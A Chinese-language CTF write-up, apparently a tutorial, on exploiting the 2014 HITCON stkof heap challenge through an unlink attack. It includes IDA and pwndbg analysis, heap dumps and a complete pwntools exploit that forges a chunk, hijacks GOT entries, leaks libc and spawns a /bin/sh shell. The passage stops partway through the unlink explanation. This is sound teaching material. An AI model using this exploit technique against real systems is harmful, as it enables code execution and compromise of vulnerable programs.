> 以2014 HITCON stkof为例进行讲解：
>
> [https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unlink/2014_hitcon_stkof](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unlink/2014_hitcon_stkof)
>
> 参考资料：
>
> [https://blog.csdn.net/qq_41202237/article/details/108481889](https://blog.csdn.net/qq_41202237/article/details/108481889) #主要思路
>
> [https://wzt.ac.cn/2018/10/16/s-pwn-project-4/](https://wzt.ac.cn/2018/10/16/s-pwn-project-4/) #payload来源
>
> **<font style="color:#F5222D;">感谢@hollk师傅的文章</font>**
>
> 附件下载：
>
> 链接：[https://pan.baidu.com/s/1tXTaLajFHdKB0Ofxnk8V4Q](https://pan.baidu.com/s/1tXTaLajFHdKB0Ofxnk8V4Q)
>
> 提取码：z4p6
>

# 题目说明及检查
系统说明：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1600856500674-e1570216-d435-4fde-9bc4-e9664061a34e.png)

libc版本：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1600856429090-a92748d0-684b-414a-b003-a77cc89638ed.png)

> 请注意：不要在libc-2.27及以上的版本进行pwn，极有可能无法getshell
>

下载文件，检查一下保护：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1600766634238-2f4a520d-0698-4ffe-88a7-5767e8647803.png)

ELF-64位文件，并且开启了NX保护和Canary保护。

# 静态分析
## 修改alarm函数的参数
将文件拖入到IDA中，直接查看main函数的伪代码：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1600766999926-186e9139-23ea-4cdf-b5b5-e843f7fb5510.png)

main的开头就是alarm函数，拿这个程序来举例，若程序的开启时长超过了120s就会自动结束进程，这个对我们gdb调试程序很不利。但是我们可以对这个程序进行patch从而使程序不会exit：

在IDA上方的工具栏中点击：选项->常规，将操作码字节数修改为8：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1600768349863-06411e3c-d852-4e02-8c38-38349d2c745c.png)

查看alarm函数的操作码，得到BF 78

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1600768456350-726e01da-5754-4fd8-bf17-0b44648f1d7c.png)

使用16进制文本编辑器打开程序，就像下面这样：（这里我使用的是HxD）

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1600768841237-822c1372-7015-4789-9647-de64f90c7832.png)

搜索“BF 78”：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1600769087428-829b2ed1-1506-49a1-9c9b-d2ce26b79b56.png)![](https://cdn.nlark.com/yuque/0/2020/png/574026/1600769088411-304ca058-8bfe-439d-85f4-d2ca23fa88c7.png)

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1600769168110-e8ba1236-c335-4132-9876-a2a91baf81f2.png)

修改为：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1600769305895-d784dc9e-45b8-42ba-9d37-6cf750662eed.png)

然后将文件保存为：stkof_patch，最后再使用IDA打开修改之后的文件，查看以下是否修改成功

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1600769857690-0d609922-d2c6-47b8-b12e-e2d1fdbca02c.png)

修改成功，之后我们gdb调试的时候使用这个修改过后的文件而不是原来的。

## IDA静态分析
### 对main函数进行分析
main函数实际上就是对程序功能的选择，具体的注释如下：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1600770974602-3d4e4799-4240-486f-8b87-652a9e46f31c.png)

### 1、对create_a_heap函数进行分析
![](https://cdn.nlark.com/yuque/0/2020/png/574026/1600775272583-6bd66ea4-2d2e-4ed2-8d02-aa1c78aeaa78.png)

> 请注意：堆的序列是从1开始的
>

### 2、对edit_a_heap函数进行分析
![](https://cdn.nlark.com/yuque/0/2020/png/574026/1600775318672-41a9b134-5926-4af2-bc1f-7d4688cf7726.png)

> **<font style="color:#F5222D;">堆溢出警告！！！</font>**
>

### 3、对delete_a_heap函数进行分析
![](https://cdn.nlark.com/yuque/0/2020/png/574026/1600775350756-54db5592-8e4c-419e-9cff-f20018493710.png)

### 4、对Check_the_usage_of_the_heap函数继续分析
![](https://cdn.nlark.com/yuque/0/2020/png/574026/1600775443953-f8d2e501-721a-4b5c-a2a2-1b44009ed917.png)

上面的代码有注释，这里不过多的细说了，主要是注意一下edit_a_heap函数中有个堆溢出漏洞就可以了。

```c
 for ( i = fread(ptr, 1uLL, n, stdin); i > 0; i = fread(ptr, 1uLL, n, stdin) )
  { // 申请的堆空间是有长度限制的，但是修改时对输入没有限制，可造成堆溢出
    ptr += i;
    n -= i;
  }
```

> fread函数原型如下：size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream)
>
> 参数：
>
> + ptr – 这是指向带有最小尺寸 size*nmemb 字节的内存块的指针
> + size – 这是要读取的每个元素的大小，以字节为单位
> + nmemb – 这是元素的个数，每个元素的大小为 size 字节
> + stream – 这是指向 FILE 对象的指针，该 FILE 对象指定了一个输入流
>
> 返回值：
>
> 成功读取的元素总数会以 size_t 对象返回，size_t 对象是一个整型数据类型。如果总数与 nmemb 参数不同，则可能发生了一个错误或者到达了文件末尾
>
> 
>
> **<font style="color:#F5222D;">简单的说，fread函数可以对堆中的数据进行录入修改。</font>**
>
> **<font style="color:#F5222D;">还有一点要说的是malloc返回的指针是指向chunk_data的，而不是prev_size</font>**
>

IDA的静态分析到此结束。

# 思路分析及动态调试
为了讲解方便，因此我们先将exp贴到文章中，请先阅读以留个印象。

```python
from pwn import *
import time
context(log_level="DEBUG")

def create(size):
    p.sendline("1")
    time.sleep(1)
    p.sendline(str(size))

def edit(index, length, content):
    p.sendline("2")
    time.sleep(1)
    p.sendline(str(index))
    time.sleep(1)
    p.sendline(str(length))
    time.sleep(1)
    p.sendline(content)

def delete(index):
    p.sendline("3")
    time.sleep(1)
    p.sendline(str(index))

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf = ELF("./stkof_patch")
p = process("./stkof_patch")

log.info("Creating chunk1, avoid stdout's buffer.")
create(0x100)
p.recvuntil("OK")
time.sleep(1)

log.info("Creating chunk2...")
create(0x30)
p.recvuntil("OK")
time.sleep(1)

log.info("Creating chunk3...")
create(0x80)
p.recvuntil("OK")
time.sleep(1)

log.info("Creating fake chunk...")
payload = p64(0) + p64(0x30) + p64(0x602140 + 16 - 0x18) + p64(0x602140 + 16 - 0x10) + 'a' * 0x10 + p64(0x30) + p64(0x90)
edit(2, len(payload), payload)
p.recvuntil("OK")
time.sleep(1)

log.info("Now we have fake chunks, just free chunk3 to change global pointer...")
delete(3)
p.recvuntil("OK")
time.sleep(1)
log.success("Global pointer has been changed!")
time.sleep(1)

log.info("Finding address in program...")
free_got = elf.got["free"]
puts_got = elf.got["puts"]
atoi_got = elf.got["atoi"]
puts_plt = elf.plt["puts"]
time.sleep(1)
log.success("free@got : 0x%x" % free_got)
log.success("puts@got : 0x%x" % puts_got)
log.success("atoi@got : 0x%x" % atoi_got)
log.success("puts@plt : 0x%x" % puts_plt)
time.sleep(1)

log.info("Overwriting global pointers...")
payload = 'a' * 8 + p64(free_got) + p64(puts_got) + p64(atoi_got)
edit(2, len(payload), payload)
p.recvuntil("OK")
log.success("Complete!")
time.sleep(1)

log.info("Changing free@got --> puts@plt...")
payload2 = p64(puts_plt)
edit(0, len(payload2), payload2)
time.sleep(1)
p.recvuntil("OK")

log.info("Leaking address...")
delete(1)
p.recvuntil("FAIL\n")
puts_addr = u64(p.recv(6) + '\x00\x00')
log.success("puts address : 0x%x" % puts_addr)
time.sleep(1)
p.recvuntil("OK")

log.info("Finding offset in libc...")
time.sleep(1)
puts_offset = libc.symbols["puts"]
log.success("atoi offset: 0x%x" % puts_offset)
time.sleep(1)
log.info("Calculating libc address...")
time.sleep(1)
libc_addr = puts_addr - puts_offset
log.success("Libc address: 0x%x" % libc_addr)
log.info("Calculating system & /bin/sh address...")
system_addr = libc_addr + libc.symbols["system"]
binsh = libc_addr + libc.search("/bin/sh").next()
log.success("system address: 0x%x" % system_addr)
log.success("/bin/sh address: 0x%x" % binsh)
time.sleep(1)
log.info("Changing atoi@got --> system@got...")
payload3 = p64(system_addr)
edit(2, len(payload3) + 1, payload3)
time.sleep(1)
p.recvuntil("OK")

log.info("Now atoi@got is system@got, so just pass the string '/bin/sh' to atoi")
log.info("Actually we called system('/bin/sh') !")
time.sleep(1)
p.send(p64(binsh))
log.info("Ready in 5 seconds...")
time.sleep(5)
log.success("PWN!!")
p.interactive()
```

## 1、模仿程序流程写出payload
```python
def create(size):
    p.sendline("1")
    time.sleep(1)
    p.sendline(str(size))

def edit(index, length, content):
    p.sendline("2")
    time.sleep(1)
    p.sendline(str(index))
    time.sleep(1)
    p.sendline(str(length))
    time.sleep(1)
    p.sendline(content)

def delete(index):
    p.sendline("3")
    time.sleep(1)
    p.sendline(str(index))
```

这个很简单，就不再多说了。

## 2、创建3个chunk
```python
log.info("Creating chunk1, avoid stdout's buffer.")
create(0x100) #0x100==256
p.recvuntil("OK")
time.sleep(1)

log.info("Creating chunk2...")
create(0x30)  #0x30==48
p.recvuntil("OK")
time.sleep(1)

log.info("Creating chunk3...")
create(0x80)  #0x80==128
p.recvuntil("OK")
time.sleep(1)
```

上面的代码创建了3个堆块，使用gdb调试进行malloc，然后CTRL+c进入调试模式：

```powershell
➜  unlink_data sudo gdb stkof_patch 
[sudo] password for ubuntu: 
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 187 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from stkof_patch...(no debugging symbols found)...done.
pwndbg> r
Starting program: /home/ubuntu/Desktop/unlink_data/stkof_patch 
1
256
1
OK
1
48
2
OK
1
128
3
OK
^C
Program received signal SIGINT, Interrupt.
0x00007ffff7b04320 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────[ REGISTERS ]──────────────────────────────────
 RAX  0xfffffffffffffe00
 RBX  0x7ffff7dd18e0 (_IO_2_1_stdin_) ◂— 0xfbad2288
 RCX  0x7ffff7b04320 (__read_nocancel+7) ◂— cmp    rax, -0xfff
 RDX  0x400
 RDI  0x0
 RSI  0xe05010 ◂— 0xa383231 /* '128\n' */
 R8   0x7ffff7dd3780 (_IO_stdfile_1_lock) ◂— 0x0
 R9   0x7ffff7fde700 ◂— 0x7ffff7fde700
 R10  0x7ffff7fde700 ◂— 0x7ffff7fde700
 R11  0x246
 R12  0xa
 R13  0x9
 R14  0xe05014 ◂— 0x0
 R15  0x7ffff7dd18e0 (_IO_2_1_stdin_) ◂— 0xfbad2288
 RBP  0x7ffff7dd2620 (_IO_2_1_stdout_) ◂— 0xfbad2a84
 RSP  0x7fffffffe438 —▸ 0x7ffff7a875f8 (_IO_file_underflow+328) ◂— cmp    rax, 0
 RIP  0x7ffff7b04320 (__read_nocancel+7) ◂— cmp    rax, -0xfff
───────────────────────────────────[ DISASM ]───────────────────────────────────
 ► 0x7ffff7b04320 <__read_nocancel+7>     cmp    rax, -0xfff
   0x7ffff7b04326 <__read_nocancel+13>    jae    read+73 <read+73>
    ↓
   0x7ffff7b04359 <read+73>               mov    rcx, qword ptr [rip + 0x2ccb18]
   0x7ffff7b04360 <read+80>               neg    eax
   0x7ffff7b04362 <read+82>               mov    dword ptr fs:[rcx], eax
   0x7ffff7b04365 <read+85>               or     rax, 0xffffffffffffffff
   0x7ffff7b04369 <read+89>               ret    
 
   0x7ffff7b0436a                         nop    word ptr [rax + rax]
   0x7ffff7b04370 <write>                 cmp    dword ptr [rip + 0x2d23c9], 0 <0x7ffff7dd6740>
   0x7ffff7b04377 <write+7>               jne    write+25 <write+25>
    ↓
   0x7ffff7b04389 <write+25>              sub    rsp, 8
───────────────────────────────────[ STACK ]────────────────────────────────────
00:0000│ rsp  0x7fffffffe438 —▸ 0x7ffff7a875f8 (_IO_file_underflow+328) ◂— cmp    rax, 0
01:0008│      0x7fffffffe440 —▸ 0x7fffffffe650 ◂— 0x1
02:0010│      0x7fffffffe448 —▸ 0x7ffff7dd18e0 (_IO_2_1_stdin_) ◂— 0xfbad2288
03:0018│      0x7fffffffe450 —▸ 0x7fffffffe500 ◂— 0xa31 /* '1\n' */
04:0020│      0x7fffffffe458 —▸ 0x7ffff7a8861e (_IO_default_uflow+14) ◂— cmp    eax, -1
05:0028│      0x7fffffffe460 ◂— 0x0
06:0030│      0x7fffffffe468 —▸ 0x7ffff7a7bc7a (_IO_getline_info+170) ◂— cmp    eax, -1
07:0038│      0x7fffffffe470 ◂— 0x0
─────────────────────────────────[ BACKTRACE ]──────────────────────────────────
 ► f 0     7ffff7b04320 __read_nocancel+7
   f 1     7ffff7a875f8 _IO_file_underflow+328
   f 2     7ffff7a8861e _IO_default_uflow+14
   f 3     7ffff7a7bc7a _IO_getline_info+170
   f 4     7ffff7a7bd88
   f 5     7ffff7a7ab8d fgets+173
   f 6           400d2e
   f 7     7ffff7a2d840 __libc_start_main+240
────────────────────────────────────────────────────────────────────────────────
pwndbg>
```

看一下bin和heap的情况：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1600857919374-466cb14f-64e6-430f-8e70-a0a2ad14c143.png)

pwngdb只显示出了一个堆的大小，可能是pwngdb的bug，不过不影响。查看各个堆块的所在位置：

```powershell
pwndbg> x/1000gx 0xe05000
0xe05000:	0x0000000000000000	0x0000000000000411 #buffer_zone1(缓冲区1)
0xe05010:	0x000000000a383231	0x0000000000000000
0xe05020:	0x0000000000000000	0x0000000000000000
0xe05030:	0x0000000000000000	0x0000000000000000
...（省略内容均为空）
0xe05410:	0x0000000000000000	0x0000000000000111 #chunk1：malloc(0x100)
0xe05420:	0x0000000000000000	0x0000000000000000
0xe05430:	0x0000000000000000	0x0000000000000000
0xe05440:	0x0000000000000000	0x0000000000000000
...（省略内容均为空）
0xe05520:	0x0000000000000000	0x0000000000000411 #buffer_zone2(缓冲区2)
0xe05530:	0x00000000000a4b4f	0x0000000000000000
0xe05540:	0x0000000000000000	0x0000000000000000
0xe05550:	0x0000000000000000	0x0000000000000000
...（省略内容均为空）
0xe05930:	0x0000000000000000	0x0000000000000041 #chunk2：malloc(0x30)
0xe05940:	0x0000000000000000	0x0000000000000000
0xe05950:	0x0000000000000000	0x0000000000000000
0xe05960:	0x0000000000000000	0x0000000000000000
0xe05970:	0x0000000000000000	0x0000000000000091 #chunk3：malloc(0x80)
0xe05980:	0x0000000000000000	0x0000000000000000
0xe05990:	0x0000000000000000	0x0000000000000000
...（省略内容均为空）
0xe05a00:	0x0000000000000000	0x0000000000020601 #top_chunk
0xe05a10:	0x0000000000000000	0x0000000000000000
0xe05a20:	0x0000000000000000	0x0000000000000000
...
0xe06f30:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

在前面我们创建了3个chunk，但是经过gdb发现程序实际上创建了5个chunk（不计入top_chunk）。

多出来的两个chunk其实是由于程序本身没有进行 setbuf 操作，所以在初次执行输入输出操作（fget函数和printf函数）的时候会申请缓冲区。

## 3、创建一个fake_chunk
从上面的堆情况可以看到，缓冲区2将chunk1与chunk2分隔开，如果要想控制chunk1就必须控制缓冲区2，而缓冲区2怎么控制？emmm，不会..

但是chunk2和chunk3的内存地址是紧邻在一起的，如果在chunk2中伪造一个fake_chunk，将chunk3释放之后就会与fake_chunk合并，嗯，就这样。

**<font style="color:#F5222D;">但是如果想要利用unlink的方式，那势必要有一个空闲块。</font>**但是我们都是malloc申请的chunk，哪来的空闲块？的确没有，但是我们可以进行伪造。假如说我们在某一个内存区域的data部分伪造一个fake_chunk，并且这个fake_chunk处于释放的状态。通过堆溢出的方式修改相邻内存堆块的prev_size和size的p标志位，使得在释放相邻内存堆块的时候发生向前合并，这样就能触发unlink了。对应到chunk2和chunk3，其图解如下：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1601193174944-de3b07ab-68a6-4f36-af70-eb2d1267c8f9.png)

> 关于p标志位：
>
> `P（PREV_INUSE）`：记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。
>
> 上图的fake_chunk的next_prev和next_size指的是：fd_nextsize， bk_nextsize
>

如果想要构造一个能人为触发unlink的fake_chunk，那么这个fake_chunk的大小至少为：

+ 0x8(prev_size) + 0x8(size) + 0x8(fd) + 0x8(bk) + 0x8(next_prev) + 0x8(next_size) = 0x30

为了能够使得在释放“chunk3”的时候能够绕过检查向前合并fake_chunk，那么chunk3的prev_size就要等于fake_chunk的size大小，即0x30，这样才能说明前一个chunk(fake_chunk)是释放状态。（原因请参照p标志位）。

> 注意：只有空闲的（被free掉的）large_chunk才有fd与bk指针，fd_nextsize， bk_nextsize也是如此。
>

若想要触发unlink，那么相邻内存的大小就必须超过fastbin的最大值，所以相邻内存的大小至少是0x90，并且size的P标志位必须为0。payload如下：

```python
log.info("Creating fake chunk...")
payload = p64(0) + p64(0x30) + p64(0x602140 + 16 - 0x18) + p64(0x602140 + 16 - 0x10) + 'a' * 0x10 + p64(0x30) + p64(0x90)
edit(2, len(payload), payload)
p.recvuntil("OK")
time.sleep(1)
```

但是到此还不知道程序写入payload的位置，可以使用程序的编辑功能来查看一下，输入任意长度的字符串：

这里我输入的是：aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

```powershell
pwndbg> c
Continuing.
2
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
FAIL
FAIL
FAIL
FAIL
FAIL
^C
Program received signal SIGINT, Interrupt.
0x00007ffff7b04320 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:84
84	in ../sysdeps/unix/syscall-template.S
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────[ REGISTERS ]──────────────────────────────────
 RAX  0xfffffffffffffe00
 RBX  0x7ffff7dd18e0 (_IO_2_1_stdin_) ◂— 0xfbad2288
 RCX  0x7ffff7b04320 (__read_nocancel+7) ◂— cmp    rax, -0xfff
 RDX  0x400
 RDI  0x0
 RSI  0xe05010 ◂— 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n'
 R8   0x7ffff7dd3780 (_IO_stdfile_1_lock) ◂— 0x0
 R9   0x7ffff7fde700 ◂— 0x7ffff7fde700
 R10  0x7ffff7fde700 ◂— 0x7ffff7fde700
 R11  0x246
 R12  0xa
 R13  0x9
*R14  0xe05041 ◂— 0x0
 R15  0x7ffff7dd18e0 (_IO_2_1_stdin_) ◂— 0xfbad2288
 RBP  0x7ffff7dd2620 (_IO_2_1_stdout_) ◂— 0xfbad2a84
 RSP  0x7fffffffe438 —▸ 0x7ffff7a875f8 (_IO_file_underflow+328) ◂— cmp    rax, 0
 RIP  0x7ffff7b04320 (__read_nocancel+7) ◂— cmp    rax, -0xfff
───────────────────────────────────[ DISASM ]───────────────────────────────────
 ► 0x7ffff7b04320 <__read_nocancel+7>     cmp    rax, -0xfff
   0x7ffff7b04326 <__read_nocancel+13>    jae    read+73 <read+73>
    ↓
   0x7ffff7b04359 <read+73>               mov    rcx, qword ptr [rip + 0x2ccb18]
   0x7ffff7b04360 <read+80>               neg    eax
   0x7ffff7b04362 <read+82>               mov    dword ptr fs:[rcx], eax
   0x7ffff7b04365 <read+85>               or     rax, 0xffffffffffffffff
   0x7ffff7b04369 <read+89>               ret    
 
   0x7ffff7b0436a                         nop    word ptr [rax + rax]
   0x7ffff7b04370 <write>                 cmp    dword ptr [rip + 0x2d23c9], 0 <0x7ffff7dd6740>
   0x7ffff7b04377 <write+7>               jne    write+25 <write+25>
    ↓
   0x7ffff7b04389 <write+25>              sub    rsp, 8
───────────────────────────────────[ STACK ]────────────────────────────────────
00:0000│ rsp  0x7fffffffe438 —▸ 0x7ffff7a875f8 (_IO_file_underflow+328) ◂— cmp    rax, 0
01:0008│      0x7fffffffe440 ◂— 0x0
02:0010│      0x7fffffffe448 —▸ 0x7ffff7dd18e0 (_IO_2_1_stdin_) ◂— 0xfbad2288
03:0018│      0x7fffffffe450 —▸ 0x7fffffffe500 ◂— 0xa616161616161 /* 'aaaaaa\n' */
04:0020│      0x7fffffffe458 —▸ 0x7ffff7a8861e (_IO_default_uflow+14) ◂— cmp    eax, -1
05:0028│      0x7fffffffe460 ◂— 0x0
06:0030│      0x7fffffffe468 —▸ 0x7ffff7a7bc7a (_IO_getline_info+170) ◂— cmp    eax, -1
07:0038│      0x7fffffffe470 ◂— 0x0
─────────────────────────────────[ BACKTRACE ]──────────────────────────────────
 ► f 0     7ffff7b04320 __read_nocancel+7
   f 1     7ffff7a875f8 _IO_file_underflow+328
   f 2     7ffff7a8861e _IO_default_uflow+14
   f 3     7ffff7a7bc7a _IO_getline_info+170
   f 4     7ffff7a7bd88
   f 5     7ffff7a7ab8d fgets+173
   f 6           400d2e
   f 7     7ffff7a2d840 __libc_start_main+240
────────────────────────────────────────────────────────────────────────────────
pwndbg> 
```

再次查看堆的状态：

```powershell
pwndbg> x/1000gx 0xe05000
0xe05000:	0x0000000000000000	0x0000000000000411  #buffer_zone1(缓冲区1)
0xe05010:	0x6161616161616161	0x6161616161616161
0xe05020:	0x6161616161616161	0x6161616161616161
0xe05030:	0x6161616161616161	0x6161616161616161
0xe05040:	0x000000000000000a	0x0000000000000000
0xe05050:	0x0000000000000000	0x0000000000000000
0xe05060:	0x0000000000000000	0x0000000000000000
...（省略内容均为空）
0xe05400:	0x0000000000000000	0x0000000000000000
0xe05410:	0x0000000000000000	0x0000000000000111  #chunk1：malloc(0x100)
0xe05420:	0x0000000000000000	0x0000000000000000
0xe05430:	0x0000000000000000	0x0000000000000000
...（省略内容均为空）
0xe05510:	0x0000000000000000	0x0000000000000000
0xe05520:	0x0000000000000000	0x0000000000000411  #buffer_zone2(缓冲区2)
0xe05530:	0x0000000a4c494146	0x0000000000000000
0xe05540:	0x0000000000000000	0x0000000000000000
...（省略内容均为空）
0xe05920:	0x0000000000000000	0x0000000000000000
0xe05930:	0x0000000000000000	0x0000000000000041  #chunk2：malloc(0x30)
0xe05940:	0x0000000000000000	0x0000000000000000
0xe05950:	0x0000000000000000	0x0000000000000000
0xe05960:	0x0000000000000000	0x0000000000000000
0xe05970:	0x0000000000000000	0x0000000000000091  #chunk3：malloc(0x80)
0xe05980:	0x0000000000000000	0x0000000000000000
0xe05990:	0x0000000000000000	0x0000000000000000
0xe059a0:	0x0000000000000000	0x0000000000000000
0xe059b0:	0x0000000000000000	0x0000000000000000
...（省略内容均为空）
0xe059f0:	0x0000000000000000	0x0000000000000000
0xe05a00:	0x0000000000000000	0x0000000000020601  #top_chunk
0xe05a10:	0x0000000000000000	0x0000000000000000
0xe05a20:	0x0000000000000000	0x0000000000000000
...（省略内容均为空）
0xe06f30:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

因此，当payload执行的时候，会写入到buffer_zone1(缓冲区1)中，payload执行之后会出现如下情况：

```powershell
pwndbg> x/1000gx 0xe05000
0xe05000:	0x0000000000000000	0x0000000000000411  #buffer_zone1(缓冲区1)
0xe05010:	0x0000000000000000	0x0000000000000030
0xe05020:	0x0000000006102138	0x0000000006102130
0xe05030:	0x6161616161616161	0x6161616161616161
0xe05040:	0x0000000000000030	0x0000000000000090
0xe05050:	0x0000000000000000	0x0000000000000000
0xe05060:	0x0000000000000000	0x0000000000000000

#payload = p64(0) + p64(0x30) + p64(0x602140 + 16 - 0x18) + p64(0x602140 + 16 - 0x10) + 'a' * 0x10 + p64(0x30) + p64(0x90)
#edit(2, len(payload), payload)
```

> 看一下上面的代码框，payload虽然在“表面上”写入了缓冲区1中，但最后是会写入到chunk2中，以下的表述均以缓冲区1来体现。（注：不同的Linux版本、不同的libc文件可能对堆（缓冲区、malloc_chunk）的管理方式不同）
>

将他看作为一个chunk：

```powershell
pwndbg> x/1000gx 0xe05000
0xe05000:	0x0000000000000000	0x0000000000000411  #buffer_zone1(缓冲区1)
#buffer_zone1_data_start
0xe05010:	0x0000000000000000	0x0000000000000030  #fake_prev_size;fake_size
0xe05020:	0x0000000006102138	0x0000000006102140  #fake_fd;fake_bk
0xe05030:	0x6161616161616161	0x6161616161616161  #fake_fd_nextsize;fake_bk_nextsize
0xe05040:	0x0000000000000030	0x0000000000000090  #next_chunk_prev_size;next_chunk_size
0xe05050:	0x0000000000000000	0x0000000000000000
0xe05060:	0x0000000000000000	0x0000000000000000，
#payload = p64(0) + p64(0x30) + p64(0x602140 + 16 - 0x18) + p64(0x602140 + 16 - 0x10) + 'a' * 0x10 + p64(0x30) + p64(0x90)
#edit(2, len(payload), payload)
```

解释一下这个代码框中出现的内容：

+ p(64)：我们只想在释放相邻内存堆块的时候向前合并fake_chunk，并且不需要合并某一内存堆块，所以将fake_chunk的prev_size置0就行。
+ p64(0x30)：fake_chunk仅仅需要fd和bk就可以完成unlink的流程，后面的next_prev和next_size仅仅为了检查时候的使用，所以将size的大小等于0x30就行
+ next_chunk_prev_size：这里其实就是为了绕过检查，证明fake_chunk是一个空闲块，所以next_prev要等于size，即0x30
+ next__chunk_size：随便设置一个数字，使二进制最低标志位P为0即可

但是为什么要将fake_chunk的fd和bk设置成0x6102138和0x6102140呢？

从前面的静态分析可以知道存放堆地址指针地址为：0x6102140，具体内容如下：

```powershell
pwndbg> x/16gx 0x602140
0x602140:	0x0000000000000000	0x0000000000e05420 #chunk1_data_ptr
0x602150:	0x0000000000e05940	0x0000000000e05980 #chunk2_data_ptr and chunk3_data_ptr
0x602160:	0x0000000000000000	0x0000000000000000
0x602170:	0x0000000000000000	0x0000000000000000
0x602180:	0x0000000000000000	0x0000000000000000
0x602190:	0x0000000000000000	0x0000000000000000
0x6021a0:	0x0000000000000000	0x0000000000000000
0x6021b0:	0x0000000000000000	0x0000000000000000
pwndbg>
```

若将上面的内容当作一个堆块呢，我们将其命名为<font style="color:#C7254E;background-color:#F9F2F4;">third_chunk</font>

```powershell
pwndbg> x/16gx 0x602140
0x602140:	0x0000000000000000	0x0000000000e05420 
          #prev_size          #size
0x602150:	0x0000000000e05940	0x0000000000e05980 
          #fd                 #bk
0x602160:	0x0000000000000000	0x0000000000000000
0x602170:	0x0000000000000000	0x0000000000000000
0x602180:	0x0000000000000000	0x0000000000000000
0x602190:	0x0000000000000000	0x0000000000000000
0x6021a0:	0x0000000000000000	0x0000000000000000
0x6021b0:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

同样的思路，将0x602140 - 0x8的位置也看做是一个chunk，那么这个chunk的bk就是0x602140，所以这个chunk可以作为<font style="color:#C7254E;background-color:#F9F2F4;">first_ch</font><font style="color:#C7254E;background-color:#F9F2F4;">unk</font>

```powershell
pwndbg> x/16gx 0x602138
0x602138:	0x0000000000000000	0x0000000000000000
          #prev_size          #size
0x602148:	0x0000000000e05420	0x0000000000e05940
          #fd                 #bk
0x602158:	0x0000000000e05980	0x0000000000000000
0x602168:	0x0000000000000000	0x0000000000000000
0x602178:	0x0000000000000000	0x0000000000000000
0x602188:	0x0000000000000000	0x0000000000000000
0x602198:	0x0000000000000000	0x0000000000000000
0x6021a8:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

大致的图解如下：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1601110960158-631346e5-f615-4055-8b73-ac600b71ba76.png)

这样一来，伪造的fake_chunk就准备齐全了：

## ![](https://cdn.nlark.com/yuque/0/2020/png/574026/1601117139375-1280ad65-d3a3-44b9-a4c0-f0c2b7aac12e.png)
> 上图中fd_nextsize和bk_nextsize的内容分别为：0x6161616161616161，0x6161616161616161
>
> 再次说明，payload实际上是写入了chunk2中，将chunk3的prev_size和size字段进行覆盖修改。
>

## 4、free(&chunk3)触发unlink
> unlink原理：  

>
> 当我们free一块内存时，系统会自动判定 待free堆块的前一个堆块和后一个堆块是否也处于free状态，如果是，那么系统会先将那个堆块从链表中卸下，并与待free堆块合并之后重新插入相应的链表，这样可以降低堆的碎片化程度，提高系统执行效率。而其中将某个堆块卸下的过程，就称为 unlink 。
>

```python
log.info("Now we have fake chunks, just free chunk3 to change global pointer...")
delete(3)
p.recvuntil("OK")
#gdb,attach(p)
time.sleep(1)
log.success("Global pointer has been changed!")
time.sleep(1)
```

为什么释放chunk3就会触发unlink？

> 在此之前，我们伪造出的fake_chunk是用双向链表与first_chunk和third_chunk相连的，记住这一点。
>

由于fake_chunk和chunk3相邻，而伪造出的fake_chunk是空闲状态，因此chunk3释放时要与fake_chunk合并成一个空闲的大chunk。系统会先将fake_chunk从third_chunk和first_chunk的双向链表中“卸下”，图解如下：

摘除之前：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1601194582198-3bd1d02a-cc0e-42a8-8d06-b5da8ab0ffb0.png)

摘除之后：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1601199961218-504d9647-48f9-4f90-8f1a-d8c6f1e89e17.png)

```python
#摘除之前
pwndbg> x/16gx 0x602138
0x602138:	0x0000000000000000	0x0000000000000000
0x602148:	0x0000000000e05420	0x0000000000e05940
